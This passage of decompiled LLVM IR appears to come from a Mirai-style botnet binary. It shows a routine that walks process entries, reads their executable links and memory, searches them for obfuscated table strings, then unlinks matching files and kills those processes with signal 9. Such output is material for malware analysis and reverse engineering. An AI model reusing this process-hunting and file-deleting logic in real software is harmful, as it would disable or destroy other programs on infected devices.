  %v2_d264 = add i32 %v2_d260, %v1_d260
  store i32 %v2_d264, i32* @r1, align 4
  %v0_d268 = call i32 @util_zero()
  %v0_d26c = load i32, i32* @r7, align 4
  store i32 %v0_d26c, i32* @r4, align 4
  %v0_d270 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d378 = ptrtoint i32* %stack_var_-160 to i32
  %v2_d384 = bitcast i32* %stack_var_-160 to i8*
  %v2_d3c8 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d3cc = bitcast i32* %stack_var_-224 to i8*
  %v2_d538 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d548 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d55c = ptrtoint i32* %stack_var_-52 to i32
  %v2_d570 = ptrtoint i32* %stack_var_-56 to i32
  %v2_d580 = ptrtoint i32* %stack_var_-64 to i32
  %v2_d588 = ptrtoint i32* %stack_var_-60 to i32
  %v2_d5ac = ptrtoint i32* %stack_var_-8416 to i32
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d340, %.thread9
  %stack_var_-8436.0 = phi i32 [ %v0_d270, %.thread9 ], [ %stack_var_-8436.3, %dec_label_pc_d340 ]
  %v1_d27c = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d288 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d28c = call i32 @__GI_opendir(i32 %v3_d288)
  store i32 %v1_d28c, i32* @r8, align 4
  %v2_d290 = icmp eq i32 %v1_d28c, 0
  br i1 %v2_d290, label %dec_label_pc_cf80, label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d278
  %v1_d29c = call i32 @table_lock_val(i32 15)
  %v0_d2a0139 = load i32, i32* @r8, align 4
  %v1_d2a4140 = inttoptr i32 %v0_d2a0139 to i32*
  %v2_d2a4141 = call i32 @__GI_readdir(i32* %v1_d2a4140)
  %v2_d2a8143 = icmp eq i32 %v2_d2a4141, 0
  br i1 %v2_d2a8143, label %dec_label_pc_d340, label %dec_label_pc_d2b0.preheader

dec_label_pc_d2b0.preheader:                      ; preds = %dec_label_pc_d298, %dec_label_pc_d2a0.backedge
  %v0_d2b0155 = phi i32 [ %v2_d2a4, %dec_label_pc_d2a0.backedge ], [ %v2_d2a4141, %dec_label_pc_d298 ]
  %stack_var_-8436.1144 = phi i32 [ %stack_var_-8436.1.be, %dec_label_pc_d2a0.backedge ], [ %stack_var_-8436.0, %dec_label_pc_d298 ]
  br label %dec_label_pc_d2b0

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d2b0.preheader, %dec_label_pc_d328
  %v0_d2c0 = phi i32 [ %v2_d334, %dec_label_pc_d328 ], [ %v0_d2b0155, %dec_label_pc_d2b0.preheader ]
  %stack_var_-8436.2 = phi i32 [ %v1_d2d4, %dec_label_pc_d328 ], [ %stack_var_-8436.1144, %dec_label_pc_d2b0.preheader ]
  %v1_d2b0 = add i32 %v0_d2c0, 11
  %v2_d2b0 = inttoptr i32 %v1_d2b0 to i8*
  %v3_d2b0 = load i8, i8* %v2_d2b0, align 1
  %v4_d2b0 = zext i8 %v3_d2b0 to i32
  %v1_d2b4 = add nsw i32 %v4_d2b0, -48
  store i32 %v1_d2b4, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d2b4, 9
  br i1 %tmp, label %dec_label_pc_d2a0.backedge, label %dec_label_pc_d2c0

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d2b0
  store i32 %v1_d2b0, i32* @r6, align 4
  store i32 %v1_d2b0, i32* @r0, align 4
  %v1_d2c8 = call i32 @atol(i32 %v1_d2b0)
  %v0_d2d0 = load i32, i32* @r5, align 4
  %v1_d2d4 = add i32 %stack_var_-8436.2, 1
  store i32 %v1_d2d4, i32* %r1.global-to-local, align 4
  store i32 %v1_d2c8, i32* @r7, align 4
  %v5_d2e0 = icmp slt i32 %v0_d2d0, %v1_d2c8
  %v2_d350 = call i32 @__GI_time(i32* null)
  br i1 %v5_d2e0, label %dec_label_pc_d34c, label %dec_label_pc_d2e4

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2c0
  %v0_d2ec = load i32, i32* @r4, align 4
  %v2_d2ec = sub i32 %v2_d350, %v0_d2ec
  %v7_d2f4 = icmp slt i32 %v2_d2ec, 601
  br i1 %v7_d2f4, label %dec_label_pc_d2fc, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2e4
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d2a0.backedge

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d2e4
  %v0_d2fc = load i32, i32* @r7, align 4
  %v7_d300 = icmp slt i32 %v0_d2fc, 401
  br i1 %v7_d300, label %dec_label_pc_d2a0.backedge, label %dec_label_pc_d304

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2fc
  %v3_d30c = zext i32 %v1_d2d4 to i64
  %v4_d30c = mul nuw i64 %v3_d30c, 3435973837
  %v3_d3101 = udiv i64 %v4_d30c, 34359738368
  %v3_d3143 = mul nuw nsw i64 %v3_d3101, 8
  %v3_d314 = trunc i64 %v3_d3143 to i32
  store i32 %v3_d314, i32* %r3.global-to-local, align 4
  %v2_d3185 = mul nuw nsw i64 %v3_d3101, 2
  %v2_d318 = trunc i64 %v2_d3185 to i32
  %v2_d31c = add i32 %v3_d314, %v2_d318
  store i32 %v2_d31c, i32* %r2.global-to-local, align 4
  %v9_d320 = icmp eq i32 %v1_d2d4, %v2_d31c
  br i1 %v9_d320, label %dec_label_pc_d328, label %dec_label_pc_d2a0.backedge

dec_label_pc_d328:                                ; preds = %dec_label_pc_d304
  %v1_d32c = call i32 @sleep(i32 1)
  %v0_d330 = load i32, i32* @r8, align 4
  %v1_d334 = inttoptr i32 %v0_d330 to i32*
  %v2_d334 = call i32 @__GI_readdir(i32* %v1_d334)
  %v2_d338 = icmp eq i32 %v2_d334, 0
  br i1 %v2_d338, label %dec_label_pc_d340, label %dec_label_pc_d2b0

dec_label_pc_d340:                                ; preds = %dec_label_pc_d2a0.backedge, %dec_label_pc_d328, %dec_label_pc_d298
  %stack_var_-8436.3 = phi i32 [ %stack_var_-8436.0, %dec_label_pc_d298 ], [ %v1_d2d4, %dec_label_pc_d328 ], [ %stack_var_-8436.1.be, %dec_label_pc_d2a0.backedge ]
  %v0_d340 = load i32, i32* @r8, align 4
  %v1_d344 = inttoptr i32 %v0_d340 to i32*
  %v2_d344 = call i32 @__GI_closedir(i32* %v1_d344)
  br label %dec_label_pc_d278

dec_label_pc_d34c:                                ; preds = %dec_label_pc_d2c0
  %v1_d35c = call i32 @table_unlock_val(i32 15)
  %v1_d364 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d370 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_d378, i32* @fp, align 4
  store i32 %v3_d370, i32* %r1.global-to-local, align 4
  store i32 %v2_d378, i32* @r0, align 4
  %v3_d384 = call i32 @util_strcpy(i8* %v2_d384, i32 %v3_d370)
  %v1_d388 = load i32, i32* @fp, align 4
  %v2_d388 = add i32 %v1_d388, %v3_d384
  store i32 %v2_d388, i32* %r5.global-to-local, align 4
  %v0_d38c = load i32, i32* @r6, align 4
  store i32 %v0_d38c, i32* %r1.global-to-local, align 4
  store i32 %v2_d388, i32* @r0, align 4
  %v2_d394 = inttoptr i32 %v2_d388 to i8*
  %v3_d394 = call i32 @util_strcpy(i8* %v2_d394, i32 %v0_d38c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d394, i32* %r4.global-to-local, align 4
  %v3_d3a4 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d3a4, i32* %r1.global-to-local, align 4
  %v1_d3ac = load i32, i32* %r5.global-to-local, align 4
  %v2_d3ac = add i32 %v1_d3ac, %v3_d394
  store i32 %v2_d3ac, i32* @r0, align 4
  %v2_d3b0 = inttoptr i32 %v2_d3ac to i8*
  %v3_d3b0 = call i32 @util_strcpy(i8* %v2_d3b0, i32 %v3_d3a4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3bc = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d3bc, i32* %r1.global-to-local, align 4
  store i32 %v2_d3c8, i32* @r0, align 4
  %v3_d3cc = call i32 @util_strcpy(i8* %v2_d3cc, i32 %v3_d3bc)
  %v2_d3d8 = add i32 %v3_d3cc, %v2_d3c8
  store i32 %v2_d3d8, i32* @r5, align 4
  store i32 %v2_d3d8, i32* @r0, align 4
  %v0_d3e0 = load i32, i32* @r6, align 4
  store i32 %v0_d3e0, i32* %r1.global-to-local, align 4
  %v2_d3e4 = inttoptr i32 %v2_d3d8 to i8*
  %v3_d3e4 = call i32 @util_strcpy(i8* %v2_d3e4, i32 %v0_d3e0)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3e4, i32* @r4, align 4
  %v3_d3f4 = call i32 @table_retrieve_val(i32 34, i32* null)
  store i32 %v3_d3f4, i32* %r1.global-to-local, align 4
  %v0_d3fc = load i32, i32* @r4, align 4
  %v1_d3fc = load i32, i32* @r5, align 4
  %v2_d3fc = add i32 %v1_d3fc, %v0_d3fc
  store i32 %v2_d3fc, i32* @r0, align 4
  %v2_d400 = inttoptr i32 %v2_d3fc to i8*
  %v3_d400 = call i32 @util_strcpy(i8* %v2_d400, i32 %v3_d3f4)
  %v1_d408 = call i32 @table_lock_val(i32 15)
  %v1_d410 = call i32 @table_lock_val(i32 16)
  store i32 %v1_d1b0, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d424 = call i32 @readlink(i32 %v2_d378, i32 %v1_d1b0, i32 4095)
  %v7_d428 = icmp eq i32 %v3_d424, -1
  store i32 %v3_d424, i32* @r5, align 4
  br i1 %v7_d428, label %dec_label_pc_d4ec, label %dec_label_pc_d434

dec_label_pc_d434:                                ; preds = %dec_label_pc_d34c
  store i32 %v1_d1b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d43c = add i32 %v3_d424, %v1_d1b0
  %v5_d43c = inttoptr i32 %v4_d43c to i8*
  store i8 0, i8* %v5_d43c, align 1
  %v1_d444 = call i32 @table_unlock_val(i32 35)
  %v0_d448 = load i32, i32* @r4, align 4
  store i32 %v0_d448, i32* %r1.global-to-local, align 4
  %v2_d450 = inttoptr i32 %v0_d448 to i32*
  %v3_d450 = call i32 @table_retrieve_val(i32 35, i32* %v2_d450)
  %v0_d454 = load i32, i32* @r5, align 4
  %v1_d454 = add i32 %v0_d454, -1
  store i32 %v1_d454, i32* @r1, align 4
  store i32 %v3_d450, i32* %r2.global-to-local, align 4
  %v4_d460 = call i32 @util_stristr(i8* %v2_d1c0, i32 %v1_d454, i32 %v3_d450)
  %v7_d464 = icmp eq i32 %v4_d460, -1
  br i1 %v7_d464, label %dec_label_pc_d480, label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d434
  %v1_d470 = call i32 @unlink(i32 %v1_d1b0)
  %v0_d474 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d47c = call i32 @kill(i32 %v0_d474, i32 9)
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d434, %dec_label_pc_d46c
  %v1_d484 = call i32 @table_lock_val(i32 35)
  %v1_d488 = call i32 @__getpid(i32 %v1_d484)
  store i32 %v1_d488, i32* @r0, align 4
  %v1_d48c = load i32, i32* @r7, align 4
  %v9_d48c = icmp eq i32 %v1_d488, %v1_d48c
  br i1 %v9_d48c, label %dec_label_pc_d4b8, label %dec_label_pc_d494

dec_label_pc_d494:                                ; preds = %dec_label_pc_d480
  %v0_d494 = call i32 @getppid()
  %v1_d498 = load i32, i32* @r7, align 4
  %v9_d498 = icmp eq i32 %v0_d494, %v1_d498
  br i1 %v9_d498, label %dec_label_pc_d4b8, label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %dec_label_pc_d494
  store i32 ptrtoint (i32* @global_var_24f84.79 to i32), i32* %r3.global-to-local, align 4
  %v2_d4a8 = load i32, i32* @global_var_24f84.79, align 4
  store i32 %v2_d4a8, i32* %r1.global-to-local, align 4
  %v3_d4ac = call i32 @util_strcmp(i8* %v2_d1c0, i32 %v2_d4a8)
  %v2_d4b0 = icmp eq i32 %v3_d4ac, 0
  br i1 %v2_d4b0, label %dec_label_pc_d4c4, label %dec_label_pc_d4a0.dec_label_pc_d4b8_crit_edge

dec_label_pc_d4a0.dec_label_pc_d4b8_crit_edge:    ; preds = %dec_label_pc_d4a0
  %v0_d4bc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d4a0.dec_label_pc_d4b8_crit_edge, %dec_label_pc_d494, %dec_label_pc_d480
  %v0_d4bc = phi i32 [ %v0_d4bc.pre, %dec_label_pc_d4a0.dec_label_pc_d4b8_crit_edge ], [ %v0_d494, %dec_label_pc_d494 ], [ %v1_d488, %dec_label_pc_d480 ]
  store i32 %v2_d350, i32* @r4, align 4
  store i32 %v0_d4bc, i32* @r5, align 4
  br label %dec_label_pc_d2a0.backedge

dec_label_pc_d2a0.backedge:                       ; preds = %dec_label_pc_d304, %dec_label_pc_d2fc, %dec_label_pc_d2b0, %dec_label_pc_d4b8, %dec_label_pc_d7f0, %.thread10
  %stack_var_-8436.1.be = phi i32 [ %v1_d2d4, %dec_label_pc_d7f0 ], [ %v1_d2d4, %dec_label_pc_d4b8 ], [ %v1_d2d4, %.thread10 ], [ %stack_var_-8436.2, %dec_label_pc_d2b0 ], [ %v1_d2d4, %dec_label_pc_d2fc ], [ %v1_d2d4, %dec_label_pc_d304 ]
  %v0_d2a0 = load i32, i32* @r8, align 4
  %v1_d2a4 = inttoptr i32 %v0_d2a0 to i32*
  %v2_d2a4 = call i32 @__GI_readdir(i32* %v1_d2a4)
  %v2_d2a8 = icmp eq i32 %v2_d2a4, 0
  br i1 %v2_d2a8, label %dec_label_pc_d340, label %dec_label_pc_d2b0.preheader

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d4a0
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4cc = call i32 @__libc_open(i32 %v1_d1b0, i32 0)
  %v7_d4d0 = icmp eq i32 %v2_d4cc, -1
  store i32 %v2_d4cc, i32* @r4, align 4
  br i1 %v7_d4d0, label %bb255, label %.thread12

bb255:                                            ; preds = %dec_label_pc_d4c4
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d4c4, %bb255
  store i32 ptrtoint (i32* @global_var_d4e4.82 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d4d0, i32 ptrtoint (i32* @global_var_114ac.81 to i32))
  %v0_d4e4 = load i32, i32* @r4, align 4
  %v1_d4e8 = call i32 @__GI___libc_close(i32 %v0_d4e4)
  br label %dec_label_pc_d4ec

dec_label_pc_d4ec:                                ; preds = %dec_label_pc_d34c, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4f4 = call i32 @__libc_open(i32 %v2_d378, i32 0)
  %v7_d4f8 = icmp eq i32 %v2_d4f4, -1
  br i1 %v7_d4f8, label %dec_label_pc_d7f0, label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d4ec
  %v1_d508 = call i32 @table_unlock_val(i32 20)
  %v1_d510 = call i32 @table_unlock_val(i32 21)
  %v1_d518 = call i32 @table_unlock_val(i32 22)
  %v1_d520 = call i32 @table_unlock_val(i32 23)
  %v1_d528 = call i32 @table_unlock_val(i32 24)
  %v1_d530 = call i32 @table_unlock_val(i32 36)
  store i32 %v2_d538, i32* %r1.global-to-local, align 4
  %v3_d540 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d548, i32* %r1.global-to-local, align 4
  store i32 %v3_d540, i32* @r6, align 4
  %v3_d554 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v2_d55c, i32* %r1.global-to-local, align 4
  store i32 %v3_d554, i32* @sl, align 4
  %v3_d568 = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v2_d570, i32* %r1.global-to-local, align 4
  store i32 %v3_d568, i32* @sb, align 4
  %v3_d57c = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v2_d588, i32* %r1.global-to-local, align 4
  %v3_d590 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v2_d580, i32* %r1.global-to-local, align 4
  %v3_d5a0 = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-64)
  store i32 %v2_d5ac, i32* @r4, align 4
  store i32 %v2_d5ac, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d5bc136 = call i32 @__libc_read(i32 %v2_d4f4)
  %tmp256 = icmp slt i32 %v1_d5bc136, 1
  br i1 %tmp256, label %dec_label_pc_d820, label %dec_label_pc_d5c8

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d504, %dec_label_pc_d5b0.backedge
  %v0_d66c127 = phi i32 [ %v1_d5bc, %dec_label_pc_d5b0.backedge ], [ %v1_d5bc136, %dec_label_pc_d504 ]
  %v3_d5cc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5cc, i32* @r5, align 4
  %v5_d5d4 = icmp slt i32 %v0_d66c127, %v3_d5cc
  br i1 %v5_d5d4, label %dec_label_pc_d5e4, label %dec_label_pc_d6ac.lr.ph

dec_label_pc_d6ac.lr.ph:                          ; preds = %dec_label_pc_d5c8
  %v1_d6a483 = add i32 %v0_d66c127, -1
  store i32 %v1_d6a483, i32* %r1.global-to-local, align 4
  %v0_d6ac.pre = load i32, i32* @r6, align 4
  %v1_d6b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d6ac

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d6a4.backedge, %dec_label_pc_d5c8
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  %v3_d5e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d5e8, i32* @r5, align 4
  %v5_d5f0 = icmp slt i32 %v0_d66c127, %v3_d5e8
  br i1 %v5_d5f0, label %dec_label_pc_d600, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d5e4
  %v1_d6d892 = add i32 %v0_d66c127, -1
  store i32 %v1_d6d892, i32* %r1.global-to-local, align 4
  %v2_d6d893 = icmp eq i32 %v0_d66c127, 0
  br i1 %v2_d6d893, label %dec_label_pc_d600, label %dec_label_pc_d6e0.lr.ph

dec_label_pc_d6e0.lr.ph:                          ; preds = %.thread28
  %v0_d6e0.pre = load i32, i32* @sl, align 4
  %v1_d6e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d6e0

dec_label_pc_d600:                                ; preds = %dec_label_pc_d6d8.backedge, %.thread28, %dec_label_pc_d5e4
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d604 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d604, i32* @r5, align 4
  %v5_d60c = icmp slt i32 %v0_d66c127, %v3_d604
  br i1 %v5_d60c, label %dec_label_pc_d61c, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_d600
  %v1_d70c101 = add i32 %v0_d66c127, -1
  store i32 %v1_d70c101, i32* %r1.global-to-local, align 4
  %v2_d70c102 = icmp eq i32 %v0_d66c127, 0
  br i1 %v2_d70c102, label %dec_label_pc_d61c, label %dec_label_pc_d714.lr.ph

dec_label_pc_d714.lr.ph:                          ; preds = %.thread37
  %v0_d714.pre = load i32, i32* @sb, align 4
  %v1_d718.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d714

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d70c.backedge, %.thread37, %dec_label_pc_d600
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d620 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_d620, i32* @r5, align 4
  %v5_d628 = icmp slt i32 %v0_d66c127, %v3_d620
  br i1 %v5_d628, label %dec_label_pc_d638, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_d61c
  %v1_d740110 = add i32 %v0_d66c127, -1
  store i32 %v1_d740110, i32* %r1.global-to-local, align 4
  %v2_d740111 = icmp eq i32 %v0_d66c127, 0
  br i1 %v2_d740111, label %dec_label_pc_d638, label %dec_label_pc_d748.lr.ph

dec_label_pc_d748.lr.ph:                          ; preds = %.thread46
  %v1_d750.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d748

dec_label_pc_d638:                                ; preds = %dec_label_pc_d740.backedge, %.thread46, %dec_label_pc_d61c
  %v3_d63c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d63c, i32* @r5, align 4
  %v5_d644 = icmp slt i32 %v0_d66c127, %v3_d63c
  br i1 %v5_d644, label %dec_label_pc_d654, label %.thread55

.thread55:                                        ; preds = %dec_label_pc_d638
  %v1_d778119 = add i32 %v0_d66c127, -1
  store i32 %v1_d778119, i32* %r1.global-to-local, align 4
  %v2_d778120 = icmp eq i32 %v0_d66c127, 0
  br i1 %v2_d778120, label %dec_label_pc_d654, label %dec_label_pc_d780.lr.ph

dec_label_pc_d780.lr.ph:                          ; preds = %.thread55
  %v1_d788.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d780

dec_label_pc_d654:                                ; preds = %dec_label_pc_d778.backedge, %.thread55, %dec_label_pc_d638
  %v3_d658 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d658, i32* @lr, align 4
  %v5_d660 = icmp slt i32 %v0_d66c127, %v3_d658
  br i1 %v5_d660, label %dec_label_pc_d5b0.backedge, label %.thread61

dec_label_pc_d5b0.backedge:                       ; preds = %dec_label_pc_d68c, %.thread61, %dec_label_pc_d654
  store i32 %v2_d5ac, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d5bc = call i32 @__libc_read(i32 %v2_d4f4)
  %tmp257 = icmp slt i32 %v1_d5bc, 1
  br i1 %tmp257, label %dec_label_pc_d820, label %dec_label_pc_d5c8

.thread61:                                        ; preds = %dec_label_pc_d654
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d66c129 = icmp eq i32 %v0_d66c127, 0
  br i1 %v2_d66c129, label %dec_label_pc_d5b0.backedge, label %dec_label_pc_d674.lr.ph

dec_label_pc_d674.lr.ph:                          ; preds = %.thread61
  %v1_d67c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d68c, %dec_label_pc_d674.lr.ph
  %v0_d66c.in = phi i32 [ %v0_d66c127, %dec_label_pc_d674.lr.ph ], [ %v0_d66c, %dec_label_pc_d68c ]
  %v0_d68c = phi i32 [ 0, %dec_label_pc_d674.lr.ph ], [ %v1_d68c, %dec_label_pc_d68c ]
  %v1_d678 = phi i32 [ 0, %dec_label_pc_d674.lr.ph ], [ %v1_d678202, %dec_label_pc_d68c ]
  %v0_d66c = add i32 %v0_d66c.in, -1
  store i32 %v3_d5a0, i32* %r3.global-to-local, align 4
  %v2_d678 = add i32 %v1_d678, %v3_d5a0
  %v3_d678 = inttoptr i32 %v2_d678 to i8*
  %v4_d678 = load i8, i8* %v3_d678, align 1
  %v6_d678 = zext i8 %v4_d678 to i32
  store i32 %v6_d678, i32* %r2.global-to-local, align 4
  %v2_d67c = add i32 %v0_d68c, %v1_d67c.pre
  %v3_d67c = inttoptr i32 %v2_d67c to i8*
  %v4_d67c = load i8, i8* %v3_d67c, align 1
  %v6_d67c = zext i8 %v4_d67c to i32
  store i32 %v6_d67c, i32* @r3, align 4
  %v9_d680 = icmp eq i8 %v4_d67c, %v4_d678
  br i1 %v9_d680, label %dec_label_pc_d7a0, label %bb258

bb258:                                            ; preds = %dec_label_pc_d674
  br label %dec_label_pc_d68c

dec_label_pc_d68c:                                ; preds = %bb258, %dec_label_pc_d7a0
  %v1_d678202 = phi i32 [ %v1_d7a0, %dec_label_pc_d7a0 ], [ 0, %bb258 ]
  %v1_d68c = add i32 %v0_d68c, 1
  store i32 %v1_d68c, i32* %r1.global-to-local, align 4
  %v2_d66c = icmp eq i32 %v0_d66c, 0
  br i1 %v2_d66c, label %dec_label_pc_d5b0.backedge, label %dec_label_pc_d674

dec_label_pc_d694:                                ; preds = %dec_label_pc_d6ac
  %v1_d694 = add i32 %v1_d6ac, 1
  store i32 %v1_d694, i32* @lr, align 4
  %v9_d698 = icmp eq i32 %v3_d5cc, %v1_d694
  br i1 %v9_d698, label %dec_label_pc_d7ac, label %dec_label_pc_d6a4.backedge

dec_label_pc_d6a4.backedge:                       ; preds = %dec_label_pc_d694, %dec_label_pc_d6c0
  %v1_d6ac160 = phi i32 [ 0, %dec_label_pc_d6c0 ], [ %v1_d694, %dec_label_pc_d694 ]
  %storemerge148 = add i32 %storemerge148.in, 1
  %v1_d6a4 = add i32 %v0_d6a4, -1
  store i32 %v1_d6a4, i32* %r1.global-to-local, align 4
  %v2_d6a4 = icmp eq i32 %v0_d6a4, 0
  br i1 %v2_d6a4, label %dec_label_pc_d5e4, label %dec_label_pc_d6ac

dec_label_pc_d6ac:                                ; preds = %dec_label_pc_d6a4.backedge, %dec_label_pc_d6ac.lr.ph
  %v0_d6a4 = phi i32 [ %v1_d6a483, %dec_label_pc_d6ac.lr.ph ], [ %v1_d6a4, %dec_label_pc_d6a4.backedge ]
  %storemerge148.in = phi i32 [ 0, %dec_label_pc_d6ac.lr.ph ], [ %storemerge148, %dec_label_pc_d6a4.backedge ]
  %v1_d6ac = phi i32 [ 0, %dec_label_pc_d6ac.lr.ph ], [ %v1_d6ac160, %dec_label_pc_d6a4.backedge ]
  %v2_d6ac = add i32 %v1_d6ac, %v0_d6ac.pre
  %v3_d6ac = inttoptr i32 %v2_d6ac to i8*
  %v4_d6ac = load i8, i8* %v3_d6ac, align 1
  %v6_d6ac = zext i8 %v4_d6ac to i32
  store i32 %v6_d6ac, i32* %r2.global-to-local, align 4
  %v2_d6b0 = add i32 %storemerge148.in, %v1_d6b0.pre
  %v3_d6b0 = inttoptr i32 %v2_d6b0 to i8*
  %v4_d6b0 = load i8, i8* %v3_d6b0, align 1
  %v6_d6b0 = zext i8 %v4_d6b0 to i32
  store i32 %v6_d6b0, i32* %r3.global-to-local, align 4
  %v9_d6b4 = icmp eq i8 %v4_d6b0, %v4_d6ac
  br i1 %v9_d6b4, label %dec_label_pc_d694, label %dec_label_pc_d6c0

dec_label_pc_d6c0:                                ; preds = %dec_label_pc_d6ac
  br label %dec_label_pc_d6a4.backedge

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6e0
  %v1_d6c8 = add i32 %v1_d6e0, 1
  store i32 %v1_d6c8, i32* @lr, align 4
  %v9_d6cc = icmp eq i32 %v3_d5e8, %v1_d6c8
  br i1 %v9_d6cc, label %dec_label_pc_d7ac, label %dec_label_pc_d6d8.backedge

dec_label_pc_d6d8.backedge:                       ; preds = %dec_label_pc_d6c8, %dec_label_pc_d6f4
  %v1_d6e0169 = phi i32 [ 0, %dec_label_pc_d6f4 ], [ %v1_d6c8, %dec_label_pc_d6c8 ]
  %storemerge147 = add i32 %storemerge147.in, 1
  %v1_d6d8 = add i32 %v0_d6d8, -1
  store i32 %v1_d6d8, i32* %r1.global-to-local, align 4
  %v2_d6d8 = icmp eq i32 %v0_d6d8, 0
  br i1 %v2_d6d8, label %dec_label_pc_d600, label %dec_label_pc_d6e0

dec_label_pc_d6e0:                                ; preds = %dec_label_pc_d6d8.backedge, %dec_label_pc_d6e0.lr.ph
  %v0_d6d8 = phi i32 [ %v1_d6d892, %dec_label_pc_d6e0.lr.ph ], [ %v1_d6d8, %dec_label_pc_d6d8.backedge ]
  %storemerge147.in = phi i32 [ 0, %dec_label_pc_d6e0.lr.ph ], [ %storemerge147, %dec_label_pc_d6d8.backedge ]
  %v1_d6e0 = phi i32 [ 0, %dec_label_pc_d6e0.lr.ph ], [ %v1_d6e0169, %dec_label_pc_d6d8.backedge ]
  %v2_d6e0 = add i32 %v1_d6e0, %v0_d6e0.pre
  %v3_d6e0 = inttoptr i32 %v2_d6e0 to i8*
  %v4_d6e0 = load i8, i8* %v3_d6e0, align 1
  %v6_d6e0 = zext i8 %v4_d6e0 to i32
  store i32 %v6_d6e0, i32* %r2.global-to-local, align 4
  %v2_d6e4 = add i32 %storemerge147.in, %v1_d6e4.pre
  %v3_d6e4 = inttoptr i32 %v2_d6e4 to i8*
  %v4_d6e4 = load i8, i8* %v3_d6e4, align 1
  %v6_d6e4 = zext i8 %v4_d6e4 to i32
  store i32 %v6_d6e4, i32* %r3.global-to-local, align 4
  %v9_d6e8 = icmp eq i8 %v4_d6e4, %v4_d6e0
  br i1 %v9_d6e8, label %dec_label_pc_d6c8, label %dec_label_pc_d6f4

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_d6e0
  br label %dec_label_pc_d6d8.backedge

dec_label_pc_d6fc:                                ; preds = %dec_label_pc_d714
  %v1_d6fc = add i32 %v1_d714, 1
  store i32 %v1_d6fc, i32* @lr, align 4
  %v9_d700 = icmp eq i32 %v3_d604, %v1_d6fc
  br i1 %v9_d700, label %dec_label_pc_d7ac, label %dec_label_pc_d70c.backedge

dec_label_pc_d70c.backedge:                       ; preds = %dec_label_pc_d6fc, %dec_label_pc_d728
  %v1_d714178 = phi i32 [ 0, %dec_label_pc_d728 ], [ %v1_d6fc, %dec_label_pc_d6fc ]
  %storemerge146 = add i32 %storemerge146.in, 1
